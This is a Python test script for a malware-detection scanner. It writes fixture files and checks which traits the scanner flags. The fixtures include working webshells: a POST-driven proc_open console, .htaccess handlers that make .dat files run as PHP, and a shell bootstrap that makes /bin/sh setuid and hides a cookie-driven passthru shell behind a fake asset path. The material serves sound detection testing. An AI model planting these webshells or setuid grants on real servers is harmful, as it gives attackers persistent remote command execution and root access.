"""Check PHP data-handler webshell admission and neutral configuration controls.

Run: python3 testdata/htaccess-addhandler-persistence/verify.py <scratch-directory>
All generated PHP is scanned as data and is never executed.
"""
import json
import os
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
CONFIG = 'objectives/command-and-control/backdoor/webshell/config::htaccess-command-webshell-handler'
COMMAND = 'objectives/command-and-control/backdoor/webshell/request/command::'
ROUTE = 'micro-behaviors/communications/http/server/route::'
STREAM = 'micro-behaviors/process/io/stream::php-proc-output-echo'
XOR = 'micro-behaviors/data/encoding/xor::php-cyclic-xor-string-reconstruction'
GRANT = 'objectives/privilege-escalation/elevation-control/setuid/shell::cookie-webshell-setuid-shell-grant'
CONSOLE = """
if (isset($_POST['job'])) {
    $child = proc_open($_POST['job'], [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $handles);
    echo stream_get_contents($handles[1]);
    proc_close($child);
}
"""
ADD = 'AddHandler application/x-httpd-php .dat\\n'
MATCH = '<FilesMatch "\\.dat$">\nSetHandler application/x-httpd-php\n</FilesMatch>\n'


def installer(handler):
    return "<?php\nfile_put_contents(__DIR__ . '/.htaccess', '" + handler + "');\n"


def scan(path):
    result = subprocess.run(
        [os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
         '--format', 'json', str(path)],
        env=dict(os.environ, CLEAVE_VALIDATE='0'),
        text=True, capture_output=True, check=True)
    return {t['id']: t['crit'] for entry in json.loads(result.stdout)['files']
            for t in entry.get('traits', [])}


def main():
    dest = Path(sys.argv[1])
    dest.mkdir(parents=True, exist_ok=True)
    cases = {
        'addhandler-console.php': (installer(ADD) + CONSOLE,
            {CONFIG, COMMAND + 'apache-data-suffix-command-webshell', STREAM}, set()),
        'filesmatch-console.php': (installer(MATCH) + CONSOLE,
            {CONFIG, COMMAND + 'apache-data-suffix-command-webshell', ROUTE + 'apache-filesmatch-data-suffix-php'}, set()),
        'handler-only.php': (installer(ADD),
            {ROUTE + 'apache-addhandler-data-suffix-php'}, {CONFIG}),
        'filesmatch-only.php': (installer(MATCH),
            {ROUTE + 'apache-filesmatch-data-suffix-php'}, {CONFIG}),
        'ordinary-php-handler.php': (installer(MATCH.replace('.dat', '.php')) + CONSOLE,
            {COMMAND + 'php-request-proc-open-console'}, {CONFIG, ROUTE + 'apache-data-suffix-php-handler'}),
        'rewrite-only.php': (installer('RewriteEngine On\\n'), set(), {CONFIG}),
        'docs-only.php': ('<?php\n// ' + ADD + '\n// .htaccess\necho "admin guide";\n', set(), {CONFIG}),
        'far-apart.php': (installer(ADD) + '// padding\n' * 500 + CONSOLE,
            {COMMAND + 'php-request-proc-open-console'}, {CONFIG}),
        'mismatched-output.php': (installer(ADD) + CONSOLE.replace('stream_get_contents($handles[1])', 'stream_get_contents($other[1])'),
            {CONFIG}, {COMMAND + 'php-request-proc-open-console', STREAM}),
        'descriptor-request.php': (installer(ADD) + CONSOLE.replace("proc_open($_POST['job'],", "proc_open('fixed-tool',").replace("['pipe', 'r']", "$_POST['job']"),
            set(), {CONFIG, COMMAND + 'php-request-proc-open-console'}),
        'xor-string.php': ('<?php\n$out .= $blob[$n] ^ $mask[$n % $width];\n', {XOR}, set()),
        'xor-no-modulo.php': ('<?php\n$out .= $blob[$n] ^ $mask[$n];\n', set(), {XOR}),
        'modulo-no-xor.php': ('<?php\n$out .= $mask[$n % $width];\n', set(), {XOR}),
        'hook.php': ("<?php\nadd_action('init', 'refresh_cache');\n", {'micro-behaviors/process/hook/event::wordpress-init-hook'}, set()),
        'package-handler.conf': ('AddType application/x-httpd-php .deb\n',
            {ROUTE + 'apache-package-signature-php-handler'},
            {'objectives/evasion/masquerade/extension-mismatch::apache-package-signature-php-handler'}),
    }
    # The relocation must preserve the conjunction: alias, handler, cookie
    # command sink, and system-shell setuid grant. Permissions alone do not.
    bootstrap = """#!/bin/sh
chmod 6555 /bin/sh
cat > /srv/site/.endpoint <<'PHP'
<?php passthru(urldecode($_COOKIE['job'])); ?>
PHP
cat >> /etc/httpd.conf <<'APACHE'
<Files ".endpoint">
SetHandler application/x-httpd-php
</Files>
Alias /assets/site.js /srv/site/.endpoint
APACHE
"""
    cases['cookie-grant.sh'] = (bootstrap, {GRANT, COMMAND + 'cookie-command-static-asset-alias'}, set())
    cases['cookie-without-grant.sh'] = (bootstrap.replace('chmod 6555', 'chmod 0755'), {COMMAND + 'cookie-command-static-asset-alias'}, {GRANT})
    cases['setuid-only.sh'] = ('#!/bin/sh\nchmod 6555 /bin/sh\n', set(), {GRANT})
    for name, (body, required, excluded) in cases.items():
        path = dest / name
        path.write_text(body)
        traits = scan(path)
        assert required <= traits.keys(), (name, 'missing', required - traits.keys())
        assert not excluded.intersection(traits), (name, 'unexpected', excluded.intersection(traits))
        if name in {'handler-only.php', 'filesmatch-only.php', 'package-handler.conf'}:
            assert all(crit < 5 for crit in traits.values()), (name, 'configuration convicted')
        print('PASS', name, flush=True)


if __name__ == '__main__':
    main()
